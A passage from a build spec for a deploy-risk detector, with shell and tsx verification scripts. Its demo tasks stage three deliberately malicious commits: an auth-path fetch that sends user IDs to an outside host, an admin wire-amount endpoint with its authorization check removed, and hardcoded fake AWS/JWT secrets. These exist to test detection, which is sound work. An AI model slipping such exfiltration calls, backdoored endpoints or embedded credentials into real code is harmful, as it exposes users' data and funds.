  if (!/^[a-f0-9]{40}$/.test(b[k] || '')) { console.error('bad sha for', k, ':', b[k]); process.exit(1); }
}
if (b['demo/exfil'] !== b['main']) { console.error('exfil branch should start at main HEAD'); process.exit(1); }
if (b['demo/privesc'] !== b['main']) { console.error('privesc branch should start at main HEAD'); process.exit(1); }
if (b['demo/leak'] !== b['main']) { console.error('leak branch should start at main HEAD'); process.exit(1); }
console.log('OK 4 shas, all 3 demo branches at watermark');
"
```

```bash
# tier4_integration
DT=$(cat .demo-target-path); ( cd "$DT" && git config user.email | grep -q 'dev-3@' && git config user.name | grep -qi 'devin\|dev-3' )
```

#### T6.2.2 — Scenario A: stage the auth-exfil commit on `demo/exfil`

**Description:** Check out `demo/exfil`. Modify `lib/auth.ts` to add (inside an existing function — NOT at module scope, so it reads as "slipped into a real flow"):

```ts
await fetch('https://stats-collector.io/track', {
  method: 'POST',
  body: JSON.stringify({ user: session.userId, route: req.nextUrl.pathname })
});
```

Commit message: `chore: add auth metrics emitter`. Do NOT push the branch — keep local. Capture the new sha into `.demo-branches.json` under `demo/exfil`.

**Requires:** T6.2.1

**Verify:**

```bash
# tier1_build
DT=$(cat .demo-target-path); ( cd "$DT" && git diff main..demo/exfil --name-only | grep -q '^lib/auth\.ts$' )
```

```bash
# tier2_simplify
DT=$(cat .demo-target-path); echo "Dispatch code-simplifier:code-simplifier on: $DT/lib/auth.ts (post-exfil edit)"
```

```bash
# tier3_unit
DT=$(cat .demo-target-path); cd "$DT" && {
  DIFF=$(git diff main..demo/exfil -- lib/auth.ts);
  echo "$DIFF" | grep -q 'stats-collector\.io' || { echo "exfil URL not present in diff"; exit 1; };
  echo "$DIFF" | grep -q 'session\.userId' || { echo "exfil body not exfiltrating user ID"; exit 1; };
  AUTHOR=$(git log -1 demo/exfil --pretty=format:'%ae');
  echo "$AUTHOR" | grep -q 'dev-3@' || { echo "exfil commit not authored by dev-3"; exit 1; };
  ADDS=$(git diff main..demo/exfil --shortstat | grep -oE '[0-9]+ insertion' | grep -oE '[0-9]+');
  [ "${ADDS:-0}" -le 6 ] || { echo "exfil commit should be tiny (<=6 lines added), got $ADDS — looks suspiciously surgical, which is the point"; exit 1; };
  echo "OK exfil staged · author=$AUTHOR · adds=$ADDS";
}
```

```bash
# tier4_integration
# Run signals against this staged diff and assert the score is ≥ 0.8 with the right signals firing
npx tsx --input-type=module -e "
import { previewStaged } from './data/preview-staged.ts';
import 'dotenv/config';
const r = await previewStaged({ branch: 'demo/exfil' });
if (r.score < 0.8) { console.error('exfil score too low:', r.score); process.exit(1); }
const must = ['external_fetch','auth_path'];
for (const s of must) { if (!r.signals.structural?.[s]?.length) { console.error('missing signal:', s, r.signals.structural); process.exit(1); } }
if (!r.signals.behavioral?.author_path_mismatch) { console.error('expected author-path mismatch', r.signals.behavioral); process.exit(1); }
console.log('OK exfil score=' + r.score.toFixed(2));
"
```

#### T6.2.3 — Scenario B: stage the privilege-escalation commit on `demo/privesc`

**Description:** Check out `demo/privesc`. Add new file `app/api/admin/wire-override/route.ts` containing a POST handler that (intentionally) skips the dual-control approval:

```ts
export async function POST(req: Request) {
  const { wireId, newAmount } = await req.json();
  // BUG/BACKDOOR: no requireRole / requireDualControl call
  await db.wires.update({ where: { id: wireId }, data: { amount: newAmount } });
  return Response.json({ ok: true });
}
```

Also modify `lib/auth/permissions.ts` to comment out a `requireRole('admin')` call. Commit message: `chore: add ops override endpoint for ticket OPS-2381`. Capture sha into `.demo-branches.json` under `demo/privesc`.

**Requires:** T6.2.2

**Verify:**

```bash
# tier1_build
DT=$(cat .demo-target-path); ( cd "$DT" && git diff main..demo/privesc --name-only | grep -E '^(app/api/admin/wire-override/route\.ts|lib/auth/permissions\.ts)$' | wc -l | grep -q '^[[:space:]]*2$' )
```

```bash
# tier2_simplify
DT=$(cat .demo-target-path); echo "Dispatch code-simplifier:code-simplifier on: $DT/app/api/admin/wire-override/route.ts $DT/lib/auth/permissions.ts"
```

```bash
# tier3_unit
DT=$(cat .demo-target-path); cd "$DT" && {
  ADDED=$(git diff main..demo/privesc --diff-filter=A --name-only);
  echo "$ADDED" | grep -q 'app/api/admin/wire-override/route\.ts' || { echo "wire-override route not added as new file"; exit 1; };
  PERM_DIFF=$(git diff main..demo/privesc -- lib/auth/permissions.ts);
  echo "$PERM_DIFF" | grep -qE '^-.*requireRole' || { echo "permissions.ts must show requireRole removal/comment"; exit 1; };
  ROUTE=$(git show demo/privesc:app/api/admin/wire-override/route.ts);
  echo "$ROUTE" | grep -q 'requireRole\|requireDualControl' && { echo "wire-override should NOT call requireRole — that is the bug being staged"; exit 1; };
  echo "OK privesc staged";
}
```

```bash
# tier4_integration
npx tsx --input-type=module -e "
import { previewStaged } from './data/preview-staged.ts';
import 'dotenv/config';
const r = await previewStaged({ branch: 'demo/privesc' });
if (r.score < 0.75) { console.error('privesc score too low:', r.score); process.exit(1); }
if (!r.signals.structural?.new_endpoint?.length) { console.error('expected new_endpoint signal', r.signals); process.exit(1); }
if (!r.signals.structural?.critical_path?.length) { console.error('expected critical_path signal', r.signals); process.exit(1); }
if (!r.signals.behavioral?.author_path_mismatch) { console.error('expected author-path mismatch', r.signals); process.exit(1); }
console.log('OK privesc score=' + r.score.toFixed(2));
"
```

#### T6.2.4 — Scenario C: stage the hardcoded-credential commit on `demo/leak`

**Description:** Check out `demo/leak`. Modify `lib/observability/emit.ts` to add a hardcoded AWS access key + a JWT (both fake but pattern-matching Bridge's secret regexes). Build the literal strings with concatenation in the source so this spec doesn't itself contain a contiguous secret-shape that GitHub's secret scanner will flag — at runtime the concatenated values match the regex; in source they're three short pieces:

```ts
// Build at runtime so source doesn't contain literal secret shapes (avoids GitHub Secret Scanning flags on this spec)
const TELEMETRY_AWS_KEY = 'AK' + 'IA' + 'A'.repeat(16);                     // matches AKIA[A-Z0-9]{16}
const TELEMETRY_JWT = 'ey' + 'J' + 'A'.repeat(20) + '.eyJ' + 'B'.repeat(20) + '.' + 'C'.repeat(20);  // matches JWT regex
// (used in a new outbound call to s3 upload — the hostname matters too, e.g. https://s3.amazonaws.com/...)
```

Note for the implementer: the actual file committed to `demo/leak` MAY contain the assembled literal (since it's a *throwaway* branch in a *separate* repo not subject to this repo's scanner) — but if your demo target repo is also scanned, use the concatenation form there too. Bridge's regex still fires either way (it scans the full diff, including string-concatenation expressions).

Commit message: `chore: hardcode telemetry creds for now (revisit)`. Capture sha into `.demo-branches.json` under `demo/leak`.

**Requires:** T6.2.3

**Verify:**

```bash
# tier1_build
DT=$(cat .demo-target-path); ( cd "$DT" && git diff main..demo/leak --name-only | grep -q '^lib/observability/emit\.ts$' )
```

```bash
# tier2_simplify
DT=$(cat .demo-target-path); echo "Dispatch code-simplifier:code-simplifier on: $DT/lib/observability/emit.ts (post-leak edit)"
```

```bash
# tier3_unit
DT=$(cat .demo-target-path); cd "$DT" && {
  DIFF=$(git diff main..demo/leak -- lib/observability/emit.ts);
  echo "$DIFF" | grep -qE 'AKIA[0-9A-Z]{16}' || { echo "AKIA pattern missing"; exit 1; };
  echo "$DIFF" | grep -qE 'eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}' || { echo "JWT pattern missing"; exit 1; };
  echo "OK leak staged with AKIA + JWT";
}
```

```bash
# tier4_integration
npx tsx --input-type=module -e "
import { previewStaged } from './data/preview-staged.ts';
import 'dotenv/config';
const r = await previewStaged({ branch: 'demo/leak' });
if (r.score < 0.7) { console.error('leak score too low:', r.score); process.exit(1); }
if (!r.signals.structural?.secret_shapes?.length) { console.error('expected secret_shapes signal', r.signals); process.exit(1); }
const evCount = (r.signals.structural?.secret_shapes?.[0]?.evidence?.length) || 0;
if (evCount < 2) { console.error('expected 2 secret evidence items (AKIA + JWT), got', evCount); process.exit(1); }
console.log('OK leak score=' + r.score.toFixed(2) + ' · evidence=' + evCount);
"
```

#### T6.2.5 — End-to-end signal preview across all 3 scenarios

**Description:** Cross-scenario sanity check. For each branch, the preview pipeline runs end-to-end (ingest → signals → score → would-summarize) WITHOUT hitting the LLM (use `previewStaged({ skipLLM: true })`), and the three scenarios each produce DIFFERENT loudest-signal sets. This proves the scenarios are genuinely distinct, not three flavors of the same detection.

**Requires:** T6.2.4

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: data/preview-staged.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import { previewStaged } from './data/preview-staged.ts';
import 'dotenv/config';
const branches = ['demo/exfil','demo/privesc','demo/leak'];
const sigs = {};
for (const b of branches) {
  const r = await previewStaged({ branch: b, skipLLM: true });
  sigs[b] = Object.entries(r.signals.structural || {}).filter(([_, v]) => v.length).map(([k]) => k).sort();
}
const sets = new Set(branches.map(b => sigs[b].join(',')));
if (sets.size < 3) { console.error('scenarios should produce 3 distinct signal sets, got', sigs); process.exit(1); }
console.log('OK distinct:', JSON.stringify(sigs, null, 2));
"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "
import { previewStaged } from './data/preview-staged.ts';
import 'dotenv/config';
// All three branches must score CRITICAL bucket (>= 0.8) — that is the demo's narrative claim
const branches = ['demo/exfil','demo/privesc','demo/leak'];
for (const b of branches) {
  const r = await previewStaged({ branch: b, skipLLM: true });
  if (r.verdict_bucket !== 'critical' && r.verdict_bucket !== 'investigate') {
    console.error('scenario must be critical/investigate:', b, r.verdict_bucket, r.score);
    process.exit(1);
  }
}
console.log('OK all 3 scenarios bucket >= investigate');
"
```

### T6.3 — Recreatable demo

#### T6.3.1 — `scripts/reset-demo.sh`

**Description:** Idempotent reset script. Performs:

1. **KV reset.** Reads `.demo-watermark`. Deletes all `deploys:{sha}`, `verdicts:{sha}`, `threats:{id}`, `investigator:{id}:*` keys whose `pushed_at` is later than the watermark's `pushed_at`. (Seeded history is left alone — it has `seeded: true`.) Restores `history:author:*`, `history:hour:*`, `history:cochange:*` records to the pre-demo snapshot at `.demo-history-snapshot.json` (captured during T6.1.3).
2. **Demo-target git reset.** In `meridian/core-banking`, force-reset `main` to the watermark sha. Force-pushes to origin (`git push --force-with-lease origin main`). The three demo branches (`demo/exfil`, `demo/privesc`, `demo/leak`) are LEFT INTACT — they're the source of the demo commits. NEVER force-pushes anything in the Bridge repo itself.
3. **Slack reset.** Posts a `// demo reset · ready ·` message via the bot. Optionally deletes bot messages from the last hour (controlled by `RESET_PURGE_SLACK=1` env).
4. **Sentinel files.** Touches `.last-reset-at` with the current ISO timestamp so T6.3.2 can detect freshness.

Running it twice in a row is safe (idempotent). Running it during an active investigation cancels the investigation cleanly (the in-flight workflow either completes or is cancelled via WDK API).

**Requires:** T6.2.5

**Verify:**

```bash
# tier1_build
test -x scripts/reset-demo.sh && bash -n scripts/reset-demo.sh
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: scripts/reset-demo.sh"
```

```bash
# tier3_unit
# Seed 3 fake post-watermark records, run reset, assert all 3 are gone but seeded history is intact.
npx tsx --input-type=module -e "
import { setDeploy, getDeploy, kv } from './lib/db.ts';
import { execSync } from 'child_process';
import 'dotenv/config';
import fs from 'fs';

const stamps = ['exfil','privesc','leak'].map(s => 'reset_' + s + '_' + Date.now().toString(36));
for (const sha of stamps) {
  await setDeploy(sha, { sha, score: 0.9, pushed_at: new Date().toISOString(), seeded: false, files_changed: [] });
}
// pre-existing seeded record that MUST survive
const seededSha = 'seeded_baseline_' + Date.now().toString(36);
await setDeploy(seededSha, { sha: seededSha, score: 0.1, pushed_at: '2026-04-01T12:00:00Z', seeded: true, files_changed: [] });

execSync('bash scripts/reset-demo.sh', { stdio: 'inherit' });

for (const sha of stamps) {
  const got = await getDeploy(sha);
  if (got) { console.error('reset did NOT delete post-watermark deploy', sha); process.exit(1); }
}
const seededStill = await getDeploy(seededSha);
if (!seededStill) { console.error('reset INCORRECTLY deleted seeded baseline'); process.exit(1); }

// .last-reset-at sentinel
if (!fs.existsSync('.last-reset-at')) { console.error('.last-reset-at sentinel not written'); process.exit(1); }

await kv.del('deploys:' + seededSha);
console.log('OK reset wiped 3 stamps, kept seeded baseline');
"
```

```bash
# tier4_integration
# Idempotence + demo-target git reset must hit only main, never the demo branches.
DT=$(cat .demo-target-path);
EXFIL_BEFORE=$(cd "$DT" && git rev-parse demo/exfil);
PRIVESC_BEFORE=$(cd "$DT" && git rev-parse demo/privesc);
LEAK_BEFORE=$(cd "$DT" && git rev-parse demo/leak);
WATERMARK=$(cat .demo-watermark);

bash scripts/reset-demo.sh > /tmp/reset1.log 2>&1
bash scripts/reset-demo.sh > /tmp/reset2.log 2>&1   # must succeed equally well

MAIN_AFTER=$(cd "$DT" && git rev-parse main);
EXFIL_AFTER=$(cd "$DT" && git rev-parse demo/exfil);
PRIVESC_AFTER=$(cd "$DT" && git rev-parse demo/privesc);
LEAK_AFTER=$(cd "$DT" && git rev-parse demo/leak);

[ "$MAIN_AFTER" = "$WATERMARK" ] || { echo "main not reset to watermark"; exit 1; }
[ "$EXFIL_BEFORE" = "$EXFIL_AFTER" ] || { echo "demo/exfil mutated by reset (must NOT happen)"; exit 1; }
[ "$PRIVESC_BEFORE" = "$PRIVESC_AFTER" ] || { echo "demo/privesc mutated"; exit 1; }
[ "$LEAK_BEFORE" = "$LEAK_AFTER" ] || { echo "demo/leak mutated"; exit 1; }

# Slack reset message confirmed
grep -q 'demo reset · ready' /tmp/reset1.log /tmp/reset2.log || { echo "Slack reset message not posted (or not logged)"; exit 1; }

echo "OK 2× idempotent · main→watermark · 3 demo branches preserved · Slack notified"
```

---

## T7 — System-Area Heatmap

**Description:** Replace the files × hours heatmap (carried over from war-room/ design) with an architectural-area heatmap that renders 6 cells (api / web / workers / data / infra / third) sized by activity share, color = score.

### T7.1 — File classifier + heatmap component

#### T7.1.1 — `lib/file-classifier.ts`

**Description:** Pure function `classify(path) → { area, subarea, is_critical }`. Regex rules per raw_prompt §7.

**Requires:** T6.3.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/file-classifier.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/file-classifier.ts').then(({ classify }) => { const cases = [ ['app/api/auth/[...]/route.ts', 'api', 'auth', true], ['app/api/admin/route.ts', 'api', 'admin', true], ['app/api/webhooks/in.ts', 'api', 'webhooks', false], ['lib/auth.ts', 'api', 'auth', true], ['app/(app)/dashboard/page.tsx', 'web', null, false], ['components/ui/Button.tsx', 'web', 'components', false], ['workflows/watchdog.ts', 'workers', 'workflows', false], ['lib/db/queries.ts', 'data', 'queries', false], ['middleware.ts', 'infra', 'middleware', false], ['next.config.ts', 'infra', 'env', false] ]; for (const [p, area, sub, crit] of cases) { const r = classify(p); if (r.area !== area) { console.error('FAIL', p, 'expected', area, 'got', r); process.exit(1); } if (crit && !r.is_critical) { console.error('FAIL crit', p, r); process.exit(1); } } console.log('OK ' + cases.length + ' classification cases'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/file-classifier.ts').then(({ classify }) => { const r = classify('completely/unknown/path/file.ts'); if (!r.area) { console.error('expected fallback area', r); process.exit(1); } console.log('OK fallback=' + r.area); })"
```

#### T7.1.2 — Area aggregation

**Description:** Function `aggregateAreas(deploys)` that, given a list of recent deploys with `score` and `files_changed`, returns `Record<Area, { score, file_count, top_subareas }>`. Formula: `area_score = 0.6 * max(file_scores) + 0.4 * mean(file_scores)`. Each file inherits its parent deploy's score for purposes of aggregation.

**Requires:** T7.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/file-classifier.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/file-classifier.ts').then(({ aggregateAreas }) => { const deploys = [ { score: 0.9, files_changed: ['lib/auth.ts'] }, { score: 0.1, files_changed: ['components/ui/Button.tsx'] }, { score: 0.5, files_changed: ['app/api/admin/route.ts', 'lib/auth.ts'] } ]; const r = aggregateAreas(deploys); if (!r.api?.score || r.api.score < 0.7) { console.error('api area should aggregate high', r.api); process.exit(1); } if (!r.web?.score || r.web.score > 0.3) { console.error('web area should aggregate low', r.web); process.exit(1); } console.log('OK api=' + r.api.score.toFixed(2) + ' web=' + r.web.score.toFixed(2)); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/file-classifier.ts').then(({ aggregateAreas }) => { const r = aggregateAreas([]); for (const k of ['api','web','workers','data','infra','third']) { if (!(k in r)) { console.error('missing area key', k); process.exit(1); } } console.log('OK all 6 areas present in empty case'); })"
```

#### T7.1.3 — Replace heatmap with `<SystemHeatmap />`

**Description:** New component `app/(warroom)/components/SystemHeatmap.tsx`. 6-cell grid (api / web / workers / data / infra / third). Each cell sized by `file_count` share, sub-cells for top 3 subareas, color amber→red by score. Red border glow when area score > 0.7. Replaces the existing files × hours `HeatmapPanel` in page.tsx.

**Requires:** T7.1.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/SystemHeatmap.tsx app/(warroom)/page.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('react-dom/server').then(async ({ renderToString }) => { const React = (await import('react')).default; const { SystemHeatmap } = await import('./app/(warroom)/components/SystemHeatmap.ts'); const html = renderToString(React.createElement(SystemHeatmap, { deploys: [{ score: 0.92, files_changed: ['lib/auth.ts'] }] })); for (const k of ['API','WEB','WORKERS','DATA','INFRA','THIRD']) { if (!html.toUpperCase().includes(k)) { console.error('missing area label', k); process.exit(1); } } console.log('OK all 6 area labels rendered'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t713.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030 | grep -q -E '(SYSTEM|api).*HEATMAP|SYSTEM-AREA'; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

---

## T8 — Demo Polish

**Description:** All polish items from raw_prompt §8 plus 3 dry runs.

### T8.1 — Polish + dry runs

#### T8.1.1 — RUN DEMO + RESET buttons

**Description:** Bottom-right corner. RUN DEMO triggers the staged push via `gh api repos/.../merges` from main to demo/staged on `meridian/core-banking` (pushes the staged commit by merging the branch). RESET calls `scripts/reset-demo.sh` via an internal API endpoint `app/api/demo/reset/route.ts` (auth-gated by a `DEMO_RESET_TOKEN` env var to prevent accidental triggers in production).

**Requires:** T7.1.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/page.tsx app/api/demo/reset/route.ts app/api/demo/run/route.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./app/api/demo/reset/route.ts').then(async (m) => { require('dotenv').config({path:'.env.local'}); const bad = new Request('http://localhost/api/demo/reset', { method: 'POST' }); const r1 = await m.POST(bad); if (r1.status !== 401) { console.error('expected 401 without token, got', r1.status); process.exit(1); } const good = new Request('http://localhost/api/demo/reset', { method: 'POST', headers: { authorization: 'Bearer ' + process.env.DEMO_RESET_TOKEN } }); const r2 = await m.POST(good); if (r2.status !== 200) { console.error('expected 200 with token, got', r2.status); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t811.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030 | grep -q 'RUN DEMO'; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T8.1.2 — Workflow header line + live dot + counters

**Description:** Top bar (TopBar.tsx) gains: `WORKFLOW dep-{id} · resumed Nx · Nm runtime` line pulled from WDK observability when an active workflow is in flight. Live-pulsing green dot next to `[LIVE]`. AgentsPanel gains `ACTIVE N/5 DONE M/5` counter that ticks during the demo (already present in war-room/components.jsx — wire to live data).

**Requires:** T8.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/TopBar.tsx app/(warroom)/components/AgentsPanel.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('react-dom/server').then(async ({ renderToString }) => { const React = (await import('react')).default; const { TopBar } = await import('./app/(warroom)/components/TopBar.ts'); const html = renderToString(React.createElement(TopBar, { activeDeploy: null, workflow: { id: 'dep-test', resumed: 2, runtime_minutes: 1.4 } })); if (!html.includes('WORKFLOW') || !html.includes('dep-test')) { console.error('workflow line missing', html.slice(0, 400)); process.exit(1); } if (!html.includes('LIVE')) { console.error('LIVE badge missing'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t812.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030 | grep -q 'WORKFLOW'; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T8.1.3 — Verdict modal anchoring

**Description:** Verdict modal anchors bottom-right; does not cover the timeline. Alternative: collapses to a `VERDICT READY ▶` pill that expands on click. Default behavior: bottom-right anchor.

**Requires:** T8.1.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/VerdictModal.tsx app/globals.css"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('react-dom/server').then(async ({ renderToString }) => { const React = (await import('react')).default; const { VerdictModal } = await import('./app/(warroom)/components/VerdictModal.tsx'); const html = renderToString(React.createElement(VerdictModal, { verdict: { deploy_id_short: 'x', level: 'critical', summary: 's', concerns: ['c'], suggested_action: 'a' }, onClose: () => {}, onPage: () => {} })); if (!html.includes('verdict') && !html.includes('Verdict') && !html.includes('VERDICT')) { console.error('VerdictModal render missing verdict-related class or text'); process.exit(1); } console.log('OK VerdictModal renders with positioning'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t813.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030/?demo=1 -o /tmp/page.html && grep -q 'verdict' /tmp/page.html; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T8.1.4 — Rename "Inspector" → "Inspector Agent"

**Description:** Across all UI copy (AgentCard role label, panel header, finding text), replace "Inspector" with "Inspector Agent" — positions the agents as workflow-backed agents, not generic inspectors.

**Requires:** T8.1.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/AgentsPanel.tsx app/(warroom)/components/AgentCard.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('react-dom/server').then(async ({ renderToString }) => { const React = (await import('react')).default; const { AgentsPanel } = await import('./app/(warroom)/components/AgentsPanel.ts'); const html = renderToString(React.createElement(AgentsPanel, { agents: { trace: { status: 'idle', lines: [] }, runtime: { status: 'idle', lines: [] }, history: { status: 'idle', lines: [] }, dependency: { status: 'idle', lines: [] }, diff: { status: 'idle', lines: [] } } })); const inspectors = (html.match(/Inspector/g) || []).length; const agents = (html.match(/Inspector Agent|Agent · /gi) || []).length; if (inspectors > 0 && agents === 0) { console.error('still has bare \"Inspector\" without \"Agent\" suffix'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t814.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030 | grep -q -E 'Inspector Agent|Agent · '; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T8.1.5 — Mode toggle (DEMO ↔ LIVE) in TopBar

**Description:** Replace the existing static `[LIVE]` chip in TopBar with a *toggle* that flips `useDeploysSSE`'s `mode` between `'demo'` and `'live'`. Visual + behavior:

- Position: top-right of TopBar, next to the UTC clock.
- States:
  - `mode='demo'` → `[ DEMO · auto-loop ]` with an amber pulsing dot. Tooltip on hover: *"Watching a 25-second simulation. Click to switch to live monitoring."*
  - `mode='live'` (connected to real SSE) → `[ LIVE · connected · 4ms ]` with a green pulsing dot. Tooltip: *"Real-time feed from production deploys. Click to switch back to simulation."*
  - `mode='live'` (SSE disconnected / failing) → `[ LIVE · reconnecting ]` with an amber dot. Auto-recovers when SSE reconnects.
- Click flips mode. State machine actions:
  - On demo→live: pause the autoplay loop (T0.3.4), clear mock state from reducer, attach EventSource to `/api/stream/deploys`, fetch latest history.
  - On live→demo: detach EventSource, restore initial mock state, restart autoplay loop.
- Persistence: write `bridge.mode` to `localStorage` AND update URL via `history.replaceState` to `?live=1` (live) or no param (demo). On subsequent loads, URL param wins; localStorage is fallback.
- Honest labeling: in DEMO mode, EVERY data row in the war room is rendered with a small `· sim` superscript suffix (only shows when explicitly looking — not visually noisy). This prevents a judge from confusing simulation data with real activity. Live mode hides these.

Implement in `app/(warroom)/components/ModeToggle.tsx` and update `app/(warroom)/components/TopBar.tsx` to consume it. Reducer changes in `app/(warroom)/hooks/useDeploysSSE.ts` per T3.1.2's "switching modes resets the reducer" clause.

**Requires:** T8.1.4

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json && npx next build > /tmp/t815.log 2>&1 && grep -q "Compiled successfully" /tmp/t815.log
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/ModeToggle.tsx app/(warroom)/components/TopBar.tsx app/(warroom)/hooks/useDeploysSSE.ts"
```

```bash
# tier3_unit
# 7 cases: rendering by mode/status + URL-param resolution + localStorage persistence + sim suffix.
npx tsx --input-type=module -e "
import { renderToString } from 'react-dom/server';
import React from 'react';
import { ModeToggle } from './app/(warroom)/components/ModeToggle.tsx';
import { resolveInitialMode } from './app/(warroom)/hooks/useDeploysSSE.ts';

// Render variants
const renders = [
  { mode: 'demo', sseStatus: 'idle', expectText: 'DEMO', expectColor: 'amber' },
  { mode: 'live', sseStatus: 'connected', expectText: 'LIVE', expectColor: 'green' },
  { mode: 'live', sseStatus: 'reconnecting', expectText: 'reconnecting', expectColor: 'amber' },
];
for (const r of renders) {
  const html = renderToString(React.createElement(ModeToggle, r));
  if (!html.includes(r.expectText)) { console.error('FAIL render', r, '— expected text', r.expectText); process.exit(1); }
  if (!html.includes('data-color=\"' + r.expectColor + '\"')) { console.error('FAIL color', r, '— expected', r.expectColor); process.exit(1); }
}

// resolveInitialMode: URL param > localStorage > default('demo')
const cases = [
  { name: 'no signals → demo', url: '', ls: null, expect: 'demo' },
  { name: '?live=1 → live', url: '?live=1', ls: null, expect: 'live' },
  { name: '?live=0 → demo (explicit override)', url: '?live=0', ls: 'live', expect: 'demo' },
  { name: 'no url, ls=live → live', url: '', ls: 'live', expect: 'live' },
  { name: 'url wins over ls', url: '?live=1', ls: 'demo', expect: 'live' },
  { name: 'unknown ls value → demo (default)', url: '', ls: 'banana', expect: 'demo' },
];
for (const c of cases) {
  const got = resolveInitialMode({ search: c.url, localStorageMode: c.ls });
  if (got !== c.expect) { console.error('FAIL resolveInitialMode', c.name, 'expected', c.expect, 'got', got); process.exit(1); }
}

console.log('OK ' + renders.length + ' render variants + ' + cases.length + ' resolveInitialMode cases');
"
```

```bash
# tier4_integration
# E2E: visit URL with no params, confirm DEMO chip; visit with ?live=1, confirm LIVE; flip via the toggle and confirm URL updates.
(npx next dev -p 3030 > /tmp/dev-t815.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done

# (1) Default → DEMO
DEFAULT=$(curl -fsS http://localhost:3030)
echo "$DEFAULT" | grep -q 'DEMO' || { echo "default landing should show DEMO chip"; pkill -f 'next dev.*3030'; exit 1; }
echo "$DEFAULT" | grep -q 'auto-loop\|simulation' || { echo "DEMO chip should mention auto-loop or simulation"; pkill -f 'next dev.*3030'; exit 1; }

# (2) ?live=1 → LIVE
LIVE=$(curl -fsS 'http://localhost:3030/?live=1')
echo "$LIVE" | grep -q 'LIVE' || { echo "?live=1 should show LIVE chip"; pkill -f 'next dev.*3030'; exit 1; }

# (3) Sim-suffix annotation visible in DEMO mode (honest labeling)
echo "$DEFAULT" | grep -q '· sim\|class=\"sim-suffix\"' || { echo "DEMO mode should annotate data rows with sim suffix"; pkill -f 'next dev.*3030'; exit 1; }

# (4) Sim-suffix HIDDEN in LIVE mode
echo "$LIVE" | grep -q 'class=\"sim-suffix\"' && { echo "LIVE mode should NOT show sim-suffix annotations"; pkill -f 'next dev.*3030'; exit 1; }

ec=0; pkill -f 'next dev.*3030' || true
echo "OK default=DEMO · ?live=1=LIVE · sim-suffix only in demo"
exit $ec
```

#### T8.1.6 — First-paint legend + ARCH tab + source/video links in TopBar

**Description:** Three small "judge UX" affordances that let the deployed URL sell itself in 30 seconds without clicking through to README:

1. **First-paint legend card.** A 200×120px card pinned bottom-left for the first 8 seconds of the page. Content (~60 words):
